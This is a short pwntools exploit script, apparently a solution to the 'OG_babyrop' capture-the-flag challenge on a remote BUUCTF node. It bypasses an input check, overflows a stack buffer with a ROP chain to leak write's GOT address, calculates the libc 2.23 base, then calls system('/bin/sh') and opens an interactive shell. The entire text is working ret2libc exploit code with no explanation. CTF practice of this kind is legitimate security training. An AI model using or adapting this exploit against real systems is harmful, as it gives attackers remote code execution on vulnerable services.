from pwn import *
from LibcSearcher import LibcSearcher
#sh = process("./OG_babyrop")
sh = remote("node5.buuoj.cn",29949)
elf = ELF("OG_babyrop")
lib = ELF("libc-2.23.so")

main_addr = 0x8048825
write_got = elf.got['write']
write_plt = elf.plt['write']

payload1 = b'\x00'+b"\xff"*(0x2c-0x25)
sh.sendline(payload1)
sh.recvuntil(b"Correct")
payload2 = b'a'*(0xe7+0x4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
sh.sendline(payload2)
write_addr = u32(sh.recv(4))
print(hex(write_addr))

lib_write = lib.symbols['write']
lib_system = lib.symbols['system']
lib_binsh = next(lib.search(b"/bin/sh"))


base_addr = write_addr - lib_write
system_addr = base_addr + lib_system
binsh_addr = base_addr + lib_binsh


payload4 = b'\x00' + b'\xff'*(0x2c-0x25)
sh.sendline(payload4)
sh.recvuntil(b'Correct')

payload3 = b"a"*(0xe7+0x4)+p32(system_addr)+b'AAAA'+p32(binsh_addr)
sh.sendline(payload3)

sh.interactive()
